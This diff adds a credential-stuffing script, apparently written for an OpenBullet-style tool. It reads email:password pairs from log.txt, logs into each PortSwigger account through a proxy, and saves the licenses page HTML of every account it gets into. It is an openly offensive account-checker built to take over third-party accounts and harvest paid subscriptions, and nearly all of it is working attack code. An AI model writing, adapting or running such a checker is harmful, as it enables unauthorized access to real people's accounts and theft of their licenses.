@@ -1,0 +1,69 @@
+## PortSwigger Subscription Extraction - SvbScript
+## Reads accounts from log.txt and extracts licenses page HTML
+
+FileReadLines "log.txt" -> VAR "accounts"
+PRINT "Loaded accounts" White
+
+CreatePath "extraction_results"
+FileWrite "extraction_results/results.json" "[\n" -> VAR "firstLine"
+
+SET VAR "counter" "0" Integer
+SET VAR "total" $"<accounts[*]>" Integer
+
+## Loop through each account
+FOREACH $"<accounts>" -> VAR "account"
+
+  SET VAR "counter" $"<counter>" Integer
+  SUM $"<counter>" 1 -> VAR "counter"
+
+  Split $"<account>" ":" -> VAR "creds"
+  SET VAR "email" $"<creds[0]>"
+  SET VAR "password" $"<creds[1]>"
+
+  PRINT "[$"<counter>"/$"<total>"] $"<email>"..." White
+
+  ## Step 1: GET login page
+  HttpRequest GET "https://login.portswigger.net/u/login" AutoRedirect=True ReadResponseSource=True AppendResponseCookies=True
+    TIMEOUT 30000
+    PROXY Default
+    -> VAR "loginPageRes"
+
+  ## Step 2: POST credentials
+  ConstantString "username=$"<email>"&password=$"<password>"&action=default" -> VAR "postData"
+
+  HttpRequest POST "https://login.portswigger.net/u/login" AutoRedirect=True ReadResponseSource=True AppendResponseCookies=True
+    CONTENT $"<postData>"
+    CONTENTTYPE "application/x-www-form-urlencoded"
+    HEADER "Referer: https://login.portswigger.net/u/login"
+    TIMEOUT 30000
+    PROXY Default
+    -> VAR "loginRes"
+
+  ## Step 3: GET licenses page
+  HttpRequest GET "https://portswigger.net/users/youraccount/licenses" AutoRedirect=True ReadResponseSource=True AppendResponseCookies=True
+    TIMEOUT 30000
+    PROXY Default
+    -> VAR "licensesRes"
+
+  ## Check if successful
+  IF $"<licensesRes>" Contains "subscription"
+    PRINT "✓ Success" Green
+
+    ## Save HTML file
+    ConstantString "extraction_results/$"<email>"_licenses.html" -> VAR "htmlFile"
+    StringToBytes $"<licensesRes>" -> VAR "htmlBytes"
+    FileWriteBytes $"<htmlFile>" $"<htmlBytes>"
+
+    SET VAR "success" "true"
+  ELSE
+    PRINT "✗ Failed" Red
+    SET VAR "success" "false"
+  ENDIF
+
+  ## Delay between requests
+  Delay 500
+
+ENDFOREACH
+
+PRINT "✓ Extraction completed" Green
+PRINT "Results saved to: extraction_results/" Green
